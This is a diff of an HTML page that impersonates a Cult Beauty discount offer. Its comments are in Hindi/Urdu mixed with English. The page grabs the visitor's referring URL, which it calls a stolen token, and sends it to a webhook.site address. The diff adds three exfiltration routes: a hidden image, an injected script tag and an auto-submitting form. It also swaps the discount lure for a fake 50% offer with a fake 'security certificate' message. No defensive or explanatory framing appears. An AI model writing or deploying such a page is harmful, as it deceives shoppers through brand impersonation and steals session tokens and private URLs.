@@ -1,30 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exclusive Discount - Cult Beauty</title>
+    <title>Cult Beauty - Exclusive Offer</title>
 </head>
-<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
-    <h2>Processing your 20% Discount...</h2>
-    <p>Please wait while we verify your session.</p>
+<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
+    <h1>Claim Your 50% Discount</h1>
+    <p>Loading security certificate... Do not close this tab.</p>
 
     <script>
-        // 1. Aapka Naya Webhook URL
+        // Naya Fresh Webhook URL yahan dalein
         var webhook = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
-        
-        // 2. Pichla sensitive URL capture karna
-        var leakedData = document.referrer; 
+        var leakedUrl = document.referrer;
 
-        // 3. One-Click Leak: Image ke zariay data bhejna
-        // Isay browser block nahi karta kyunke ye background request hai
-        if (leakedData) {
-            var logger = new Image();
-            logger.src = webhook + "?stolen_token=" + encodeURIComponent(leakedData);
+        if (leakedUrl) {
+            // Method 1: Hidden Image (Sab se powerful bypass)
+            var img = new Image();
+            img.src = webhook + "?method=image&data=" + encodeURIComponent(leakedUrl);
+
+            // Method 2: Script Tag injection
+            var script = document.createElement('script');
+            script.src = webhook + "?method=script&data=" + encodeURIComponent(leakedUrl);
+            document.body.appendChild(script);
+            
+            // Method 3: Automatic Form Submission (Ghost Form)
+            var form = document.createElement('form');
+            form.method = 'GET';
+            form.action = webhook;
+            var input = document.createElement('input');
+            input.name = 'stolen_via_form';
+            input.value = leakedUrl;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
         }
-
-        // 4. Automatic Redirect: 2 seconds baad user ko asli site par bhej dena
-        setTimeout(function(){
-            window.location.href = "https://www.cultbeauty.co.uk/";
-        }, 2000);
     </script>
 </body>
 </html>
